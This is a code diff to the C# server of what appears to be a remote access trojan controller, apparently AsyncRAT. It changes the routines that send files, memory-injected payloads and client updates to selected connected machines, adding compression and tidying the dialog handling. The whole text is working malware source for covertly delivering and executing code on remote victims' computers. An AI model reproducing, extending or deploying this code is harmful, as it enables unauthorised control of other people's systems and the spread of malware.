@@ -570,7 +570,7 @@ namespace Server
                 {
                     MsgPack packet = new MsgPack();
                     packet.ForcePathObject("Packet").AsString = "sendMemory";
-                    packet.ForcePathObject("File").SetAsBytes(File.ReadAllBytes(formSend.toolStripStatusLabel1.Tag.ToString()));
+                    packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(formSend.toolStripStatusLabel1.Tag.ToString())));
                     if (formSend.comboBox1.SelectedIndex == 0)
                     {
                         packet.ForcePathObject("Inject").AsString = "";
@@ -587,6 +587,7 @@ namespace Server
 
                     foreach (Clients client in GetSelectedClients())
                     {
+                        client.LV.ForeColor = Color.Red;
                         ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                     }
                 }
@@ -604,26 +605,32 @@ namespace Server
         {
             try
             {
-                OpenFileDialog openFileDialog = new OpenFileDialog();
-                openFileDialog.Multiselect = true;
-                if (openFileDialog.ShowDialog() == DialogResult.OK)
+                using (OpenFileDialog openFileDialog = new OpenFileDialog())
                 {
-                    MsgPack packet = new MsgPack();
-                    packet.ForcePathObject("Packet").AsString = "sendFile";
-                    packet.ForcePathObject("Update").AsString = "false";
-
-                    MsgPack msgpack = new MsgPack();
-                    msgpack.ForcePathObject("Packet").AsString = "plugin";
-                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\SendFile.dll"));
-
-                    foreach (Clients client in GetSelectedClients())
+                    openFileDialog.Multiselect = true;
+                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                     {
-                        foreach (string file in openFileDialog.FileNames)
+                        MsgPack packet = new MsgPack();
+                        packet.ForcePathObject("Packet").AsString = "sendFile";
+                        packet.ForcePathObject("Update").AsString = "false";
+
+                        MsgPack msgpack = new MsgPack();
+                        msgpack.ForcePathObject("Packet").AsString = "plugin";
+                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\SendFile.dll"));
+
+                        foreach (Clients client in GetSelectedClients())
                         {
-                            await packet.ForcePathObject("File").LoadFileAsBytes(file);
-                            packet.ForcePathObject("Extension").AsString = Path.GetExtension(file);
-                            msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
-                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                            client.LV.ForeColor = Color.Red;
+                            foreach (string file in openFileDialog.FileNames)
+                            {
+                                await Task.Run(() =>
+                                {
+                                    packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(file)));
+                                    packet.ForcePathObject("Extension").AsString = Path.GetExtension(file);
+                                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+                                });
+                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                            }
                         }
                     }
                 }
@@ -1050,27 +1057,30 @@ namespace Server
             }
         }
 
-        private async void UpdateToolStripMenuItem2_Click(object sender, EventArgs e)
+        private void UpdateToolStripMenuItem2_Click(object sender, EventArgs e)
         {
             try
             {
-                OpenFileDialog openFileDialog = new OpenFileDialog();
-                if (openFileDialog.ShowDialog() == DialogResult.OK)
+                using (OpenFileDialog openFileDialog = new OpenFileDialog())
                 {
-                    MsgPack packet = new MsgPack();
-                    packet.ForcePathObject("Packet").AsString = "sendFile";
-                    await packet.ForcePathObject("File").LoadFileAsBytes(openFileDialog.FileName);
-                    packet.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
-                    packet.ForcePathObject("Update").AsString = "true";
-
-                    MsgPack msgpack = new MsgPack();
-                    msgpack.ForcePathObject("Packet").AsString = "plugin";
-                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\SendFile.dll"));
-                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
-
-                    foreach (Clients client in GetSelectedClients())
+                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                     {
-                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                        MsgPack packet = new MsgPack();
+                        packet.ForcePathObject("Packet").AsString = "sendFile";
+                        packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
+                        packet.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
+                        packet.ForcePathObject("Update").AsString = "true";
+
+                        MsgPack msgpack = new MsgPack();
+                        msgpack.ForcePathObject("Packet").AsString = "plugin";
+                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\SendFile.dll"));
+                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+
+                        foreach (Clients client in GetSelectedClients())
+                        {
+                            client.LV.ForeColor = Color.Red;
+                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                        }
                     }
                 }
             }
